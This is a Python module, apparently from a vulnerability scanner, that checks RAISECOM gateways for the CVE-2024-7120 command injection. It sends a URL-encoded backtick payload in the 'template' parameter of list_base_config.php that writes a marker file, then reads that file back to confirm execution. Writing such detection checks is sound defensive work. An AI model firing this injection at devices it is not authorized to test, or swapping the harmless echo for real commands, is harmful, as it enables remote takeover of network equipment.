"""Agent Asteroid implementation for CVE-2024-7120"""

import logging

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Command Injection in RAISECOM Gateway Devices"
VULNERABILITY_REFERENCE = "CVE-2024-7120"
VULNERABILITY_DESCRIPTION = (
    "RAISECOM Gateway devices are vulnerable to command injection via the `template` parameter "
    "in the `list_base_config.php` script. This vulnerability allows remote attackers to execute arbitrary commands."
)
RISK_RATING = "CRITICAL"
RECOMMENDATION = (
    "- Apply security patches from RAISECOM if available.\n"
    "- Restrict access to the vulnerable endpoint.\n"
    "- Monitor and validate command execution on the device."
)
DEFAULT_PORT = 80
INJECTION_PAYLOAD = (
    "`echo%20-e%20%27This%20is%20a%20Command%20Injection%27%20%3E%20/www/tmp/info.html`"
)
REACHABLE_CHECK_TITLE = "Web user login"
REACHABLE_CHECK_META = '<META content="MSHTML 6.00.2900.5583" name=GENERATOR></HEAD>'

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)


def _is_endpoint_reachable(session: definitions.HttpSession, url: str) -> bool:
    """Checks if the endpoint is reachable and contains specific content."""
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        if (
            REACHABLE_CHECK_TITLE in response.text
            and REACHABLE_CHECK_META in response.text
        ):
            return True
    except requests_exceptions.RequestException as error:
        logger.error("Request failed: %s", error)
    return False


def _detect_command_injection(session: definitions.HttpSession, url: str) -> bool:
    """Checks if the command injection is successful."""
    try:
        injection_url = f"{url}/vpn/list_base_config.php?type=mod&parts=base_config&template={INJECTION_PAYLOAD}"
        session.get(injection_url, timeout=10)

        response = session.get(f"{url}/tmp/info.html", timeout=10)
        response.raise_for_status()
        if "This is a Command Injection" in response.text:
            return True
    except requests_exceptions.RequestException as error:
        logger.error("Request failed: %s", error)
    return False


@exploits_registry.register
class CVE20247120Exploit(definitions.Exploit):
    """Exploit for CVE-2024-7120: Command Injection in RAISECOM Gateway Devices"""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        recommendation=RECOMMENDATION,
    )

    def accept(self, target: definitions.Target) -> bool:
        """Check if the target is valid for this exploit."""
        url = f"{target.origin}/vpn/list_base_config.php"
        return _is_endpoint_reachable(self.session, url)

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Checks for vulnerabilities in the target."""
        vulnerabilities = []

        if _detect_command_injection(self.session, target.origin) is True:
            vulnerabilities.append(self.create_vulnerability(target))

        return vulnerabilities
